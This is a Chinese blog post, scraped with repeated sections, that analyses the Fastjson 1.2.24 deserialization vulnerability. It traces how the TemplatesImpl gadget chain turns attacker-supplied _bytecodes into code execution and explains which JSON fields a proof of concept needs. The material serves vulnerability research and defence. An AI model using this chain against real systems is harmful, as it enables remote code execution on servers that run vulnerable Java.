方法可见如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6ba89b567b638379ac0955cf3ee0e318.png\"></p>\n<p>程序从clazz（目标类对象）中通过getMethods获取本类以及父类或者父接口中所有的公共方法，接着进行循环判断这些方法是否可以加入fieldList中以便后续处理</p>\n<p>条件一、方法名需要长于4</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ba4f3c36c37c86019bd3e46a81de0b2.png\"></p>\n<p>条件二、不是静态方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d63f0488efd86adc06ef29945da02942.png\"></p>\n<p>条件三、以get字符串开头，且第四个字符需要是大写字母</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b01f974fd81355c9ace3ba5f6222a4d8.png\"></p>\n<p>条件四、方法不能有参数传入</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/87ac3c7ff9cb6348d836cf02a97a5f7e.png\"></p>\n<p>条件五、继承自Collection || Map || AtomicBoolean || AtomicInteger ||<br>AtomicLong</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/95ac194ec336d6e610097b3b038b254b.png\"></p>\n<p>条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1544f565ed123a2f83dff21f3e2bc05f.png\"></p>\n<h3 id=\"问题三解答\"><a href=\"#问题三解答\" class=\"headerlink\" title=\"问题三解答\"></a>问题三解答</h3><blockquote>\n<p>JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?</p>\n</blockquote>\n<p>通过上文的分析可以发现，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式从执行流程几乎一样，结果也完全相同；然而使用JSON.parseObject(jsonstr)这种方式，执行的结果与返回值却与前两者不同：JSON.parseObject(jsonstr)返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用。</p>\n<p>通过阅读源码可以发现JSON.parseObject(String text)实现如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b856db3404b87d708cd00edfbbd9ee30.png\"></p>\n<p>parseObject(String text)其实就是执行了parse(),随后将返回的Java对象通过JSON.toJSON（）转为JSONObject对象。</p>\n<p>JSON.toJSON()方法会将目标类中所有getter方法记录下来，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ce86b2ba9f56c78fdddea1d1e030dedb.png\"></p>\n<p>随后通过反射依次调用目标类中所有的getter方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a657b27f84e6bbeeb8f70706ba9108fa.png\"></p>\n<p>完整的调用链如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/c7b24c882c04cc7e6c42a423176985be.png\"></p>\n<p>总结：</p>\n<p>上文例子中，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)可以认为是完全一样的，而parseObject(String text)是在二者的基础上又执行了一次JSON.toJSON()</p>\n<p>parse(String text)、parseObject(String text)与parseObject(String text, Class&lt;T&gt; clazz)目标类Setter\\Getter调用情况</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>parse(String text)</th>\n<th>parseObject(String text)</th>\n<th>parseObject(String text, Class&lt;T&gt; clazz)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Setter调用情况</td>\n<td>全部</td>\n<td>全部</td>\n<td>全部</td>\n</tr>\n<tr>\n<td>Getter调用情况</td>\n<td>部分</td>\n<td>全部</td>\n<td>部分</td>\n</tr>\n</tbody></table>\n<p>此外，如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数。（在下文中，为TemplatesImpl类中无setter方法的私有变量_tfactory以及_name赋值运用到的就是这个知识点）</p>\n<h2 id=\"TemplatesImpl攻击调用链路\"><a href=\"#TemplatesImpl攻击调用链路\" class=\"headerlink\" title=\"TemplatesImpl攻击调用链路\"></a>TemplatesImpl攻击调用链路</h2><p>针对于上文的分析可以发现，无论使用哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法</p>\n<p>如果一个类中的Getter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p>\n<p>TemplatesImpl类恰好满足这个要求：</p>\n<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中存在一个名为_outputPropertiesget的私有变量，其getter方法中存在利用点，这个getter方法恰好满足了调用条件，在JSON字符串被解析时可以调用其在调用FastJson.parseObject()序列化为Java对象时会被调用，下面我们详细说明一下：</p>\n<p>首先我们从漏洞点开始，一层层往入口分析：首先看一下TemplatesImpl类中的getTransletInstance方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/dafa5052e153c29eb5d22bb0ff4c69f5.png\"></p>\n<p>其中455行调用_class[_transletIndex]的newInstance( )方法来实例化对象的操作</p>\n<p>我们看一下_class[_transletIndex]是如何获取的，是否可以控制_class与_transletIndex值皆由451行处defineTransletClasses()方法中获取</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ee4112a8a2ea2b7000c82d287fb3201.png\"></p>\n<p>我们跟入defineTransletClasses()方法中一探究竟</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/62b59f97a0c97819aabac6c2ac1de16a.png\"></p>\n<p>在defineTransletClasses()方法中，首先在393行判断_bytecodes值是否为空</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/42e45309e4d50cc3bb655dab8a23df91.png\"></p>\n<p>值得注意的是，_bytecodes变量是TemplatesImpl类的成员变量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5254995c16eeb34452e0a82cbac85b46.png\"></p>\n<p>因此_bytecodes变量可以在构造json字符串时传入，在构造poc时属于可控变量 _bytecodes变量非空值时，程序将会继续执行至下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6bbe808584d5a8e5d3c7b24d41400b7e.png\"></p>\n<p>此时，需要满足_tfactory变量不为null，否则导致程序异常退出。这就是为什么公开的poc中需要设置设置_tfactory为{}的原因。因为_tfactory为私有变量，且无setter方法，这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值</p>\n<p>接下来，程序将会把_bytecodes变量中的值循环取出并通过loader.defineClass处理后赋值给_class[i]</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png\"></p>\n<p>我们首先来看下loader.defineClass方法是什么</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ec061c3b3c86c1b3a02482df692a8eea.png\"></p>\n<p>可见，loader.defineClass方法其实就是对ClassLoader.defineClass的重写。defineClass方法可以从传入的字节码转化为Class</p>\n<p>回头分析下上述流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png\"></p>\n<p>_bytecodes变量非空值时，程序将会把_bytecodes数组中的值循环取出，使用loader.defineClass方法从字节码转化为Class对象，随后后赋值给_class[i]。如果此时的class为main class，_transletIndex变量值则会是此时_bytecodes数组中的下标值.因此当我们构造出_bytecodes:[evilCode]这样的json字符串（evilCode字符串为我们构造的恶意类的字节码）后，程序会将evilCode化为Class对象后赋值给_class[0]</p>\n<p>现在回到getTransletInstance()方法中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/7485cd6227bab22112407edb3fc801c2.png\"></p>\n<p>此时的_class[_transletIndex]即为我们构造传入的evilCode类.程序通过调用evilCode类的newInstance()方法来实例化对象的操作，这将导致我们构造的evilCode类中的恶意代码被执行.但在此之前，需要在poc构造json字符串时使得成员变量_name不为空，否则程序还未执行到将evilCode类实例化就提前return</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/36340dd97c18b7074c08d30fd9fce4b7.png\"></p>\n<p>注意：由于私有变量_name没有setter方法，在反序列化时想给这个变量赋值则需要使用Feature.SupportNonPublicField参数。</p>\n<p>在分析完存在漏洞的getTransletInstance方法，我们需要找到一条调用链，这条调用链需要在使用fastjson处理json字符串时成功串连到存在漏洞的getTransletInstance方法上。我们继续向上跟踪代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a99fa86415c1e44425807b808c4feff6.png\"></p>\n<p>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java中newTransformer()方法中调用了getTransletInstance()。继续向上跟踪</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/873e4c395da9922f4755f03fdb6142e5.png\"></p>\n<p>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java getOutputProperties()方法中调用了newTransformer()</p>\n<p>getOutputProperties()方法为_outputProperties成员变量的getter方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/26c8c8cf214c6def1efa536683527acf.png\"></p>\n<p>细心的读者可能会发现，成员变量_outputProperties与其getter方法getOutputProperties()方法名字并不完全一致，多了一个下划线，fastjson是如何将其对应的呢？实际上，fastjson在解析的时候调用了一个smartMatch() 方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6864c0cd6b84a6dbcf73d21ba3803c9c.png\"></p>\n<p>在寻找_outputProperties的getter方法时，程序将下划线置空，从而产生了成员变量_outputProperties与getter方法getOutputProperties()对应的形式</p>\n<h2 id=\"FastJson与TemplatesImpl的有趣结合\"><a href=\"#FastJson与TemplatesImpl的有趣结合\" class=\"headerlink\" title=\"FastJson与TemplatesImpl的有趣结合\"></a>FastJson与TemplatesImpl的有趣结合</h2><p>首先说TemplatesImpl类。经过上文分析可发现：TemplatesImpl中存在一个反序列化利用链，在反序列化过程中，如果该类的getOutputProperties()方法被调用，即可成功触发代码执行漏洞。</p>\n<p>再来分析下FastJson：经过上文对FastJson三种不同途径处理JSON字符串时关于getter方法被调用的条件来看，TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。无论通过fastjson哪种方式解析json字符串，都会触发getOutputProperties()方法。</p>\n<p>二者放在一起一拍即合：FastJson在反序列化TemplatesImpl类时会恰好触发TemplatesImpl类的getOutputProperties()方法；TemplatesImpl类的getOutputProperties()方法被触发就会引起反序列化代码执行漏洞。所以说这个漏洞利用很是巧妙。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>针对Fastjson 1.2.24反序列化漏洞的利用方式有很多，本文由于篇幅有限仅对比较巧妙的TemplatesImpl攻击调用链路进行举例。后续将会对Fastjson历史漏洞进行详细的分析，希望大家喜欢。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h1 id=\"Fastjson-1-2-24反序列化漏洞深度分析\"><a href=\"#Fastjson-1-2-24反序列化漏洞深度分析\" class=\"headerlink\" title=\" Fastjson 1.2.24反序列化漏洞深度分析\"></a> Fastjson 1.2.24反序列化漏洞深度分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。近几年来fastjson漏洞层出不穷，本文将会谈谈近几年来fastjson RCE漏洞的源头：17年fastjson爆出的1.2.24反序列化漏洞。以这个漏洞为基础，详细分析fastjson漏洞的一些细节问题。</p>\n<p>关于Fastjson 1.2.24反序列化漏洞，自从17年以来已经有很多人分析过了，一些基础内容本文就不再陈述了。此次漏洞简单来说，就是Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时由于没有进行合理检查而导致的</p>\n<p>本文将着重分析一下这个漏洞没有被详细介绍过的细节问题，如下：</p>\n<ol>\n<li>parseObject(String text) 、parse (String text)、 parseObject(String text, Class&lt;T&gt; clazz)三个方法从代码层面上来看，究竟有何不同？</li>\n<li>使用TemplatesImpl攻击调用链路构造poc时，为什么一定需要构造_tfactory以及_name字段？</li>\n<li>_outputProperties与其getter方法getOutputProperties()方法名字并不完全一致是如何解决的？</li>\n</ol>\n<p>除此之外，本文在介绍TemplatesImpl攻击调用链路时，以模拟寻找漏洞利用链的思路，从最终的执行点开始向上寻找入口，模拟还原出挖掘这个TemplatesImpl利用链的完整过程。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class&lt;T&gt; clazz)三个方法，我们进行一个测试</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2a482f1a4f410547c0ac9a3b7876dffa.png\"></p>\n<p>FastJsonTest类中变量以及其setter/getter关系如下表</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>public String t1</th>\n<th>private int t2</th>\n<th>private Boolean t3</th>\n<th>private Properties t4</th>\n<th>private Properties t5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>setter</td>\n<td>有</td>\n<td>有</td>\n<td>无</td>\n<td>无</td>\n<td>有</td>\n</tr>\n<tr>\n<td>getter</td>\n<td>有</td>\n<td>有</td>\n<td>有</td>\n<td>有</td>\n<td>有</td>\n</tr>\n</tbody></table>\n<p>接下来，我们分别使用下图三种方式分别将JSON字符串反序列化成Java对象</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5968e24e6caa97be9562234c80400e8.png\"></p>\n<ol>\n<li>Object obj = JSON.parse(jsonstr);</li>\n<li>Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);</li>\n<li>Object obj = JSON.parseObject(jsonstr);</li>\n</ol>\n<p>首先我们运行一下Object obj = JSON.parse(jsonstr);这种方式</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d4d30014d4d24a2897bfa65da386fec4.png\"></p>\n<p>结果：</p>\n<ul>\n<li><p>setT1() 、setT2() 、getT4() 、setT5() 被调用</p>\n</li>\n<li><p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p>\n</li>\n</ul>\n<p>接着我们运行下Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/888051938003f40fb97aa91a724e5887.png\"></p>\n<p>结果：</p>\n<ul>\n<li><p>与JSON.parse(jsonstr);这种方式一样setT1() 、setT2() 、getT4() 、setT5() 被调用</p>\n</li>\n<li><p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p>\n</li>\n</ul>\n<p>最后我们运行下Object obj = JSON.parseObject(jsonstr);</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21c2453ce372bcfc605f96bb97a9fdc4.png\"></p>\n<p>结果：</p>\n<ul>\n<li>这次结果与上两次大不相同，FastJsonTest类中的所有getter与setter都被调用</li>\n<li>JSON.parseObject(jsonstr);返回一个JSONObject对象</li>\n</ul>\n<p>通过上文运行结果，不难发现有三个问题</p>\n<ol>\n<li>使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？</li>\n<li>使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?</li>\n<li>JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?</li>\n</ol>\n<h3 id=\"问题一解答\"><a href=\"#问题一解答\" class=\"headerlink\" title=\"问题一解答\"></a>问题一解答</h3><blockquote>\n<p> 使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？</p>\n</blockquote>\n<p>经过调试可以发现，无论使用JSON.parse(jsonstr);或是JSON.parseObject(jsonstr, FastJsonTest.class);方式解析json字符串，程序最终都会调用位于com/alibaba/fastjson/util/JavaBeanInfo.java中的JavaBeanInfo.build()方法来获取并保存目标Java类中的成员变量以及其对应的setter、getter</p>\n<p>首先来看下JSON.parse(jsonstr)这种方式，当程序执行到JavaBeanInfo.build()方法时情景如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0c9cd8220940fbcb60fc3bb987a34b15.png\"></p>\n<p>此时的调用链如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1f5f848eaa7b8c1af2ea4febf61ba3a9.png\"></p>\n<p>此时传入JavaBeanInfo.build() 方法的参数值如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3bd0543cc0dc52a33e44fca9b345c270.png\"></p>\n<p>再来看下JSON.parseObject(jsonstr, FastJsonTest.class)这种方式，当程序执行到JavaBeanInfo.build() 方法时情景如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/440177acd687179a1be554c61759897f.png\"></p>\n<p>此时的调用链如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d05b4a2272ab1219c192345455013b0c.png\"></p>\n<p>此时传入JavaBeanInfo.build() 方法的参数值如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/80d1735b7c2742cf729ba6729b5e189e.png\"></p>\n<p>二者执行到JavaBeanInfo.build() 方法时调用链对比如下</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21ee55654a62cb8f7750458052485dfe.png\"></p>\n<p>可见二者后面的调用链是完全一样的。二者不同点在于调用JavaBeanInfo.build()<br>方法时传入clazz参数的来源不同：</p>\n<ul>\n<li><p>JSON.parseObject(jsonstr, FastJsonTest.class)在调用JavaBeanInfo.build()方法时传入的clazz参数源于parseObject方法中第二个参数中指定的“FastJsonTest.class”。</p>\n</li>\n<li><p>JSON.parse(jsonstr);这种方式调用JavaBeanInfo.build()方法时传入的clazz参数获取于json字符串中@type字段的值。</p>\n</li>\n</ul>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f0c8407956fe7df0df4b42b3199b6e2a.png\"></p>\n<p>关于JSON.parse(jsonstr);从json字符串中@type字段获取clazz参数，具体代码如下</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2757daa1052b75266d159af6096ed25e.png\"></p>\n<p>程序通过解析传入的json字符串的@type字段值来获取之后传入JavaBeanInfo.build()方法的clazz参数</p>\n<p>因此，只要Json字符串的@type字段值与JSON.parseObject(jsonstr, FastJsonTest.class);中第二个参数中类名一致，见下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2d3c790ca89e2d2ed8999c4f170ffe92.png\"></p>\n<p>JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)这两种方式执行的过程与结果是完全一致的。二者唯一的区别就是获取clazz参数的途径不同</p>\n<h3 id=\"问题二解答\"><a href=\"#问题二解答\" class=\"headerlink\" title=\"问题二解答\"></a>问题二解答</h3><blockquote>\n<p>  使用JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?</p>\n</blockquote>\n<p>这个问题要从JavaBeanInfo.build() 方法中获取答案：</p>\n<p>通过上文的分析可以发现，程序会使用JavaBeanInfo.build()方法对传入的json字符串进行解析。在JavaBeanInfo.build()方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter方法及某些特定条件的 getter方法。通过上文的结果可见，目标类中所有的setter方法都可以被调用，但只有getT4()这一个getter被调用，那么到底什么样的getter方法可以满足要求并被加入fieldList数组中呢？</p>\n<p>在JavaBeanInfo.build() 方法可见如下代码</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6ba89b567b638379ac0955cf3ee0e318.png\"></p>\n<p>程序从clazz（目标类对象）中通过getMethods获取本类以及父类或者父接口中所有的公共方法，接着进行循环判断这些方法是否可以加入fieldList中以便后续处理</p>\n<p>条件一、方法名需要长于4</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ba4f3c36c37c86019bd3e46a81de0b2.png\"></p>\n<p>条件二、不是静态方法</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d63f0488efd86adc06ef29945da02942.png\"></p>\n<p>条件三、以get字符串开头，且第四个字符需要是大写字母</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b01f974fd81355c9ace3ba5f6222a4d8.png\"></p>\n<p>条件四、方法不能有参数传入</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/87ac3c7ff9cb6348d836cf02a97a5f7e.png\"></p>\n<p>条件五、继承自Collection || Map || AtomicBoolean || AtomicInteger ||<br>AtomicLong</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/95ac194ec336d6e610097b3b038b254b.png\"></p>\n<p>条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1544f565ed123a2f83dff21f3e2bc05f.png\"></p>\n<h3 id=\"问题三解答\"><a href=\"#问题三解答\" class=\"headerlink\" title=\"问题三解答\"></a>问题三解答</h3><blockquote>\n<p>JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?</p>\n</blockquote>\n<p>通过上文的分析可以发现，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式从执行流程几乎一样，结果也完全相同；然而使用JSON.parseObject(jsonstr)这种方式，执行的结果与返回值却与前两者不同：JSON.parseObject(jsonstr)返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用。</p>\n<p>通过阅读源码可以发现JSON.parseObject(String text)实现如下</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b856db3404b87d708cd00edfbbd9ee30.png\"></p>\n<p>parseObject(String text)其实就是执行了parse(),随后将返回的Java对象通过JSON.toJSON（）转为JSONObject对象。</p>\n<p>JSON.toJSON()方法会将目标类中所有getter方法记录下来，见下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ce86b2ba9f56c78fdddea1d1e030dedb.png\"></p>\n<p>随后通过反射依次调用目标类中所有的getter方法</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a657b27f84e6bbeeb8f70706ba9108fa.png\"></p>\n<p>完整的调用链如下</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/c7b24c882c04cc7e6c42a423176985be.png\"></p>\n<p>总结：</p>\n<p>上文例子中，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)可以认为是完全一样的，而parseObject(String text)是在二者的基础上又执行了一次JSON.toJSON()</p>\n<p>parse(String text)、parseObject(String text)与parseObject(String text, Class&lt;T&gt; clazz)目标类Setter\\Getter调用情况</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>parse(String text)</th>\n<th>parseObject(String text)</th>\n<th>parseObject(String text, Class&lt;T&gt; clazz)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Setter调用情况</td>\n<td>全部</td>\n<td>全部</td>\n<td>全部</td>\n</tr>\n<tr>\n<td>Getter调用情况</td>\n<td>部分</td>\n<td>全部</td>\n<td>部分</td>\n</tr>\n</tbody></table>\n<p>此外，如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数。（在下文中，为TemplatesImpl类中无setter方法的私有变量_tfactory以及_name赋值运用到的就是这个知识点）</p>\n<h2 id=\"TemplatesImpl攻击调用链路\"><a href=\"#TemplatesImpl攻击调用链路\" class=\"headerlink\" title=\"TemplatesImpl攻击调用链路\"></a>TemplatesImpl攻击调用链路</h2><p>针对于上文的分析可以发现，无论使用哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法</p>\n<p>如果一个类中的Getter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p>\n<p>TemplatesImpl类恰好满足这个要求：</p>\n<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中存在一个名为_outputPropertiesget的私有变量，其getter方法中存在利用点，这个getter方法恰好满足了调用条件，在JSON字符串被解析时可以调用其在调用FastJson.parseObject()序列化为Java对象时会被调用，下面我们详细说明一下：</p>\n<p>首先我们从漏洞点开始，一层层往入口分析：首先看一下TemplatesImpl类中的getTransletInstance方法</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/dafa5052e153c29eb5d22bb0ff4c69f5.png\"></p>\n<p>其中455行调用_class[_transletIndex]的newInstance( )方法来实例化对象的操作</p>\n<p>我们看一下_class[_transletIndex]是如何获取的，是否可以控制_class与_transletIndex值皆由451行处defineTransletClasses()方法中获取</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ee4112a8a2ea2b7000c82d287fb3201.png\"></p>\n<p>我们跟入defineTransletClasses()方法中一探究竟</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/62b59f97a0c97819aabac6c2ac1de16a.png\"></p>\n<p>在defineTransletClasses()方法中，首先在393行判断_bytecodes值是否为空</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/42e45309e4d50cc3bb655dab8a23df91.png\"></p>\n<p>值得注意的是，_bytecodes变量是TemplatesImpl类的成员变量</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5254995c16eeb34452e0a82cbac85b46.png\"></p>\n<p>因此_bytecodes变量可以在构造json字符串时传入，在构造poc时属于可控变量 _bytecodes变量非空值时，程序将会继续执行至下图红框处</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6bbe808584d5a8e5d3c7b24d41400b7e.png\"></p>\n<p>此时，需要满足_tfactory变量不为null，否则导致程序异常退出。这就是为什么公开的poc中需要设置设置_tfactory为{}的原因。因为_tfactory为私有变量，且无setter方法，这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值</p>\n<p>接下来，程序将会把_bytecodes变量中的值循环取出并通过loader.defineClass处理后赋值给_class[i]</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png\"></p>\n<p>我们首先来看下loader.defineClass方法是什么</p>\n<p><img 